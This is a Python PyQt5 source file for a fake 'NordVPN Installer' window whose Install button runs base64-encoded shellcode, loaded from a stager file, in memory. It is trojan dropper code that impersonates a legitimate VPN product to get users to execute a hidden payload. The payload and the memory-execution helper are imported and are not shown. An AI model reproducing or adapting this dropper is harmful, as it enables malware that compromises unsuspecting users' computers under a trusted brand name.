import sys, base64
from PyQt5.QtWidgets import QApplication, QLabel, QPushButton, QVBoxLayout, QWidget
from utils.memexec import execute_shellcode

with open("stager/payload.b64", "r") as f:
    shellcode_b64 = f.read()

class InstallerUI(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("NordVPN Installer")
        self.setFixedSize(400, 200)

        layout = QVBoxLayout()
        layout.addWidget(QLabel("Welcome to NordVPN Setup."))
        install_button = QPushButton("Install")
        install_button.clicked.connect(self.on_install)
        layout.addWidget(install_button)
        self.setLayout(layout)

    def on_install(self):
        execute_shellcode(shellcode_b64)
        self.close()

def main():
    app = QApplication(sys.argv)
    window = InstallerUI()
    window.show()
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()
